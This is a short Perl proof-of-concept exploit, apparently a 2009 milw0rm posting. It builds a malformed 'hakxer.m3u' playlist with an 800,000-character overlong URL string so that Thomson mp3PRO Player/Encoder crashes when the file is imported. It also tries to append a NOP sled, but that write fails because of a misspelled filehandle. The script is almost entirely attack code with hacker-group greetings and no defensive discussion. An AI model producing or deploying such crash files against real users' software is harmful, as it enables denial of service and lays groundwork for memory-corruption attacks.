#!/usr/bin/perl
# Discovered & Written by : Hakxer [ Sec-geeks.com] EgY Coders Team :D
# program  : Thomson mp3PRO Player/Encoder  [ M3U File ] Crash PoC
# what happen .. : when you import hakxer.m3u file into program ....... Get Crashed :D
# Greetz : EgyptianxHacker , Providor , EgY Coders team , Bin@ry , Sec-geeks.com , Stealth
# Proud to Be Egyptian & Arabian .....
#
# Download : http://www.mp3prozone.com/assets/mp3PROAudioPlayer.exe .. thx

my $SC="\x48\x61\x6B\x78\x65\x72"; # Secret c0de :D

my $c0d3="\x90" x 500000;
my $fake="http://"."A" x 800000;
open(MYFILE,'>>hakxer.m3u');
print MYFILE $fake;
print MFFILE $c0d3;
close(MYFILE);
print "PoC Created .. Hakxer [sec-geeks.com] EgY Coders Team my SC : $SC";

# milw0rm.com [2009-01-29]
